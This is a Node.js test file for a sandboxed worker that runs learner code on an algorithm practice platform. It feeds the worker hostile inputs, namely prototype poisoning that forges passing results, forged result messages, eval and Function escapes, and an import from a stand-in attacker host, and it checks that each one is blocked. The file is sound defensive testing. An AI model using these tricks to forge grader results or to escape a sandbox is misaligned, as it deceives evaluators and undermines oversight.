'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const test = require('node:test');
const vm = require('node:vm');

const workerSource = fs.readFileSync(
  path.resolve(__dirname, '../public/testRunnerWorker.js'),
  'utf8'
);

function runWorker(code, testCases) {
  const messages = [];
  let tick = 0;
  const sandbox = {
    performance: { now: () => ++tick },
    navigator: {},
    postMessage: (message) => messages.push(message),
  };
  sandbox.self = sandbox;
  vm.createContext(sandbox);
  vm.runInContext(workerSource, sandbox, { timeout: 500 });
  sandbox.onmessage({
    data: {
      protocol: 'algovista-runner-v1',
      requestId: 'isolation-test',
      code,
      testCases,
    },
  });
  return messages;
}

function completion(messages) {
  return messages.find((message) => message.event === 'complete');
}

test('practice worker resists prototype poisoning and returns trustworthy results', () => {
  const messages = runWorker(`
    Array.prototype.map = () => [{ passed: true, got: 'forged' }];
    Array.prototype.every = () => true;
    JSON.stringify = () => '"forged"';
    Object.keys = () => [];
    performance.now = () => -1000;
    function solve(values) { return values.slice().reverse(); }
  `, [{ input: [[1, 2, 3]], expected: [3, 2, 1] }]);

  assert.equal(messages.filter((message) => message.event === 'case-started').length, 1);
  const resultEnvelope = completion(messages);
  assert.equal(resultEnvelope.protocol, 'algovista-runner-v1');
  assert.equal(resultEnvelope.requestId, 'isolation-test');
  assert.equal(resultEnvelope.results.length, 1);
  assert.equal(resultEnvelope.results[0].passed, true);
  assert.equal(resultEnvelope.results[0].got, '[3,2,1]');
  assert.ok(resultEnvelope.results[0].durationMs >= 0);
});

test('practice worker blocks network APIs and learner response forgery', () => {
  const messages = runWorker(`
    function solve() {
      let blocked = 0;
      try { fetch('/api/auth/session'); } catch { blocked += 1; }
      try { postMessage({ protocol: 'algovista-runner-v1', requestId: 'forged', results: [] }); } catch { blocked += 1; }
      try { new WebTransport('https://example.com'); } catch { blocked += 1; }
      return blocked;
    }
  `, [{ input: [], expected: 3 }]);

  assert.equal(messages.some((message) => message.requestId === 'forged'), false);
  const resultEnvelope = completion(messages);
  assert.equal(resultEnvelope.requestId, 'isolation-test');
  assert.equal(resultEnvelope.results[0].passed, true);
});

test('practice worker keeps bootstrap capabilities private and disables evaluator escape hatches', () => {
  const messages = runWorker(`
    function solve() {
      let blocked = 0;
      if (typeof nativePostMessage === 'undefined') blocked += 1;
      if (typeof NativeFunction === 'undefined') blocked += 1;
      try { Function('return 1')(); } catch { blocked += 1; }
      try { eval('1 + 1'); } catch { blocked += 1; }
      try { (() => {}).constructor('return 1')(); } catch { blocked += 1; }
      try { (async () => {}).constructor('return 1')(); } catch { blocked += 1; }
      try { setTimeout('postMessage(1)', 0); } catch { blocked += 1; }
      try { onmessage({ data: {} }); } catch { blocked += 1; }
      return blocked;
    }
  `, [{ input: [], expected: 8 }]);

  const resultEnvelope = completion(messages);
  assert.equal(resultEnvelope.requestId, 'isolation-test');
  assert.equal(resultEnvelope.results[0].passed, true);
});

test('practice worker rejects module syntax inside the isolation boundary', () => {
  const messages = runWorker(`
    function solve() { return import('https://attacker.invalid/module.js'); }
  `, [{ input: [], expected: null }]);

  const result = completion(messages).results[0];
  assert.equal(result.passed, false);
  assert.equal(result.kind, 'unsupported-runtime-api');
  assert.match(result.error, /Module loading is disabled/);
});
